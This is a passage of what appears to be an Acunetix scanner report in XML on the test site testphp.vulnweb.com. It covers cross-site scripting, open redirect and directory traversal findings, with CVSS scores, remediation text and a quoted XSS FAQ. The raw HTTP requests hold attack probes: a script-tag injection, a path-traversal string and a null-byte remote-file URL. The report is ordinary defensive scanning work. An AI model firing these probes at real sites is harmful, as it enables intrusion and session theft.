          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix CRLF Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/crlf-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Whitepaper -  HTTP Response Splitting]]></Database>
          <URL><![CDATA[http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Introduction to HTTP Response Splitting]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5WP0E2KFGK.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="27" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pp</font></b> was set to <b><font color="dark">12'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;E3b5(9877)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[pp]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=valid&amp;pp=12'%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;E3b5(9877)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:36 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 46
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Annihilation]]></Database>
          <URL><![CDATA[http://ha.ckers.org/blog/20060602/xss-annihilation/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="28" color="orange">
       <Name><![CDATA[URL redirection]]></Name>
       <ModuleName><![CDATA[Scripting (XFS_and_Redir.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">r</font></b> was set to <b><font color="dark">http://www.vulnweb.com</font></b>.]]></Details>
       <Affects><![CDATA[/redir.php]]></Affects>
       <Parameter><![CDATA[r]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[A remote attacker can redirect users from your website to a specified URL. This problem may assist an attacker to conduct phishing attacks, trojan distribution, spammers.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to URL redirection attacks. <br/><br/>URL redirection is sometimes used as a part of phishing attacks that confuse visitors about which web site they are visiting.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should properly sanitize user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /redir.php?r=http://www.vulnweb.com HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Moved Temporarily
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:44 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: http://www.vulnweb.com
Content-Length: 0
]]></Response>
       </TechnicalDetails>
       <CWE id="601"><![CDATA[CWE-601]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[URL Redirection Security Vulnerability]]></Database>
          <URL><![CDATA[http://www.acunetix.com/vulnerabilities/url-redirection/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics]]></Database>
          <URL><![CDATA[http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="29" color="red">
       <Name><![CDATA[Directory traversal (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Traversal.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">1ACUSTARTFILE/../../xxx\..\..\ACUENDFILE</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[/hj/var/www//showimage.php]]></AOP_SourceFile>
       <AOP_SourceLine>7</AOP_SourceLine>
       <AOP_Additional><![CDATA[File: 1ACUSTARTFILE/../../xxx\..\..\ACUENDFILE
&quot;fopen&quot; was called.]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[By exploiting directory traversal vulnerabilities, attackers step out of the root directory and access files in other directories. As a result, attackers might view restricted files or execute commands, leading to a full compromise of the Web server.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to directory traversal attacks.<br/><br/>Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=1ACUSTARTFILE/../../xxx%5c..%5c..%5cACUENDFILE HTTP/1.1
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect: enabled
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:53 GMT
Content-Type: image/jpeg
Content-Length: 138
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
]]></Response>
       </TechnicalDetails>
       <CWE id="22"><![CDATA[CWE-22]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Directory Traversal Attacks]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/directory-traversal.htm]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="30" color="red">
       <Name><![CDATA[Cross site scripting]]></Name>
       <ModuleName><![CDATA[Scripting (Remote_File_Inclusion_XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://testasp.vulnweb.com/t/xss.html?%00.jpg</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

